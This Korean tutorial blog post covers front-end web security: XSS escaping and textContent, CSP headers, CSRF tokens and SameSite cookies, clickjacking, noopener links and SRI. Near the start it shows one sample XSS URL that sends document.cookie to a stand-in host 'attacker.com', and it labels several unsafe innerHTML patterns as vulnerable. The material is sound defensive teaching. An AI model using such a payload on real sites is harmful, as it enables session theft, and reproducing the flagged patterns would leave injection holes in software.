---
layout: post
title: "HTML 보안 기초 완전 정리 — XSS 방어, CSP 헤더, CSRF, 안전한 HTML 작성"
description: "프론트엔드 개발자가 알아야 할 HTML 보안 핵심을 정리합니다. XSS(크로스 사이트 스크립팅) 공격 원리와 방어법, Content Security Policy(CSP) 헤더 설정, CSRF 토큰, iframe 클릭재킹 방지, 안전한 외부 링크 처리, Subresource Integrity(SRI)까지 다룹니다."
date: 2015-03-15 09:00:00 +0900
category: html
level: advanced
series: "HTML/CSS 처음부터 끝까지"
series_order: 45
tags: [html5, 보안, XSS, CSP, CSRF, 클릭재킹, SRI, 웹보안, 프론트엔드보안]
lang: ko
---

보안은 백엔드의 영역이라고 생각하기 쉽지만, 많은 취약점이 HTML과 JavaScript를 잘못 작성하는 데서 시작됩니다. 프론트엔드 개발자가 반드시 알아야 할 보안 개념을 정리합니다.

---

## XSS — 크로스 사이트 스크립팅

공격자가 웹 페이지에 악의적인 스크립트를 삽입하는 공격입니다. 세션 탈취, 개인정보 유출, 피싱 페이지로 리디렉션 등을 일으킬 수 있습니다.

**반사형 XSS** — URL 파라미터를 그대로 페이지에 출력할 때 발생합니다.

```
https://myblog.com/search?q=<script>document.location='https://attacker.com?c='+document.cookie</script>
```

**저장형 XSS** — 댓글, 게시물 같은 사용자 입력이 DB에 저장되고 다른 사용자에게 표시될 때 발생합니다.

---

## XSS 방어 — 이스케이프와 textContent

**가장 중요한 원칙: 사용자 입력 데이터는 절대 innerHTML로 삽입하지 않습니다.**

```javascript
// ❌ 위험: innerHTML은 HTML로 파싱됨
container.innerHTML = userInput;

// ✅ 안전: textContent는 텍스트로만 처리됨
container.textContent = userInput;
```

HTML을 출력해야만 한다면 반드시 이스케이프 처리를 합니다.

```javascript
function escapeHTML(str) {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}

// 또는 수동 치환
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 사용
container.innerHTML = `<p>${escapeHTML(userInput)}</p>`;
```

---

## DOM 기반 XSS 취약 패턴

```javascript
// ❌ URL 해시를 innerHTML에 직접 삽입
document.getElementById('msg').innerHTML = location.hash.slice(1);

// ❌ URL 파라미터를 innerHTML에 삽입
const params = new URLSearchParams(location.search);
document.getElementById('name').innerHTML = params.get('name');

// ❌ document.write 사용
document.write(location.search);

// ✅ 모두 textContent로 교체
document.getElementById('msg').textContent = location.hash.slice(1);
```

---

## href와 src의 javascript: 스킴 차단

```javascript
// ❌ 위험: javascript: URL이 실행될 수 있음
link.href = userProvidedUrl;

// ✅ URL을 검증 후 사용
function isSafeUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false; // 상대 URL이나 잘못된 URL
  }
}

if (isSafeUrl(userProvidedUrl)) {
  link.href = userProvidedUrl;
} else {
  link.removeAttribute('href');
}
```

---

## Content Security Policy (CSP)

서버가 브라우저에게 "어디서 온 리소스만 허용하라"고 지시하는 HTTP 헤더입니다. XSS 공격이 성공해도 악성 스크립트 실행을 차단할 수 있습니다.

**HTTP 헤더로 설정 (서버 측)**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://www.googletagmanager.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.myblog.com;
  frame-ancestors 'none';
```

**HTML meta 태그로 설정 (일부 제한 있음)**

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
```

**CSP 디렉티브 주요 값**

| 값 | 의미 |
|----|------|
| `'self'` | 현재 출처만 허용 |
| `'none'` | 아무것도 허용하지 않음 |
| `'unsafe-inline'` | 인라인 스크립트/스타일 허용 (권장 안 함) |
| `'unsafe-eval'` | eval() 허용 (권장 안 함) |
| `'nonce-값'` | 특정 nonce를 가진 인라인 스크립트만 허용 |
| `https:` | HTTPS로 제공되는 모든 것 허용 |

**nonce 기반 인라인 스크립트 허용**

```html
<!-- 서버가 요청마다 임의의 nonce를 생성 -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-r4nd0m9x2'">

<!-- 같은 nonce가 있는 스크립트만 실행됨 -->
<script nonce="r4nd0m9x2">
  console.log('이 스크립트는 허용됨');
</script>
```

---

## CSRF — 크로스 사이트 요청 위조

로그인된 사용자가 의도하지 않은 요청을 하도록 유도하는 공격입니다.

**방어: SameSite 쿠키**

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

- `SameSite=Strict` — 같은 사이트의 요청에만 쿠키 전송
- `SameSite=Lax` — 안전한 메서드(GET) + 최상위 탐색에만 전송
- `Secure` — HTTPS에서만 전송
- `HttpOnly` — JavaScript로 쿠키 접근 불가

**방어: CSRF 토큰**

```html
<form action="/post/delete" method="POST">
  <!-- 서버가 생성한 임의 토큰 -->
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  <button type="submit">삭제</button>
</form>
```

서버는 요청에 포함된 CSRF 토큰과 세션의 토큰을 비교합니다.

---

## 클릭재킹 방어

투명한 iframe 위에 버튼을 겹쳐서 사용자가 의도치 않게 클릭하게 만드는 공격입니다.

```
X-Frame-Options: DENY          # 어떤 사이트도 iframe 금지
X-Frame-Options: SAMEORIGIN    # 같은 출처만 허용
```

CSP로도 설정 가능합니다.

```
Content-Security-Policy: frame-ancestors 'none';
```

---

## 안전한 외부 링크 처리

```html
<!-- ❌ 위험: 새 탭이 opener를 통해 원래 페이지를 조작할 수 있음 -->
<a href="https://evil.com" target="_blank">링크</a>

<!-- ✅ 안전 -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">링크</a>
```

- `noopener` — 새 탭이 `window.opener`에 접근 못 함
- `noreferrer` — Referer 헤더 전송 안 함, noopener도 포함

---

## Subresource Integrity (SRI)

CDN에서 가져오는 외부 스크립트가 변조됐는지 확인합니다.

```html
<!-- 스크립트 해시값을 미리 계산해서 integrity 속성에 추가 -->
<script
  src="https://cdnjs.cloudflare.com/ajax/libs/marked/9.0.0/marked.min.js"
  integrity="sha384-실제해시값을여기에"
  crossorigin="anonymous">
</script>

<link
  rel="stylesheet"
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
  integrity="sha384-실제해시값을여기에"
  crossorigin="anonymous">
```

해시가 다르면 브라우저가 리소스 사용을 차단합니다. CDN이 해킹돼 파일이 변조되어도 실행을 막을 수 있습니다.

---

## 보안 체크리스트

**XSS 방어**
- [ ] 사용자 입력은 모두 `textContent`로 삽입
- [ ] HTML 출력이 꼭 필요하면 이스케이프 처리
- [ ] `javascript:` URL 사용자 입력 차단
- [ ] CSP 헤더 설정

**안전한 외부 리소스**
- [ ] 외부 링크에 `rel="noopener noreferrer"` 추가
- [ ] CDN 스크립트에 SRI `integrity` 해시 추가
- [ ] `X-Frame-Options` 또는 CSP `frame-ancestors` 설정

**쿠키/인증**
- [ ] 세션 쿠키에 `HttpOnly`, `Secure`, `SameSite` 설정
- [ ] 상태 변경 요청에 CSRF 토큰 적용

**로컬 스토리지**
- [ ] localStorage에 민감한 정보(비밀번호, 토큰) 저장 금지
- [ ] data-* 속성에 민감한 정보 저장 금지

---

## 정리

이것으로 HTML/CSS 처음부터 끝까지 시리즈 45편이 완료됩니다.

- **XSS**: `innerHTML` 대신 `textContent`, 이스케이프 처리
- **CSP**: 허용된 출처의 리소스만 실행되도록 서버에서 헤더 설정
- **CSRF**: SameSite 쿠키, CSRF 토큰으로 방어
- **클릭재킹**: `X-Frame-Options: DENY` 또는 CSP `frame-ancestors`
- **외부 링크**: `rel="noopener noreferrer"` 필수
- **SRI**: CDN 리소스 변조를 `integrity` 해시로 방어

웹 보안은 지속적으로 새로운 취약점이 발견됩니다. OWASP(owasp.org)와 MDN 보안 문서를 주기적으로 참고하세요.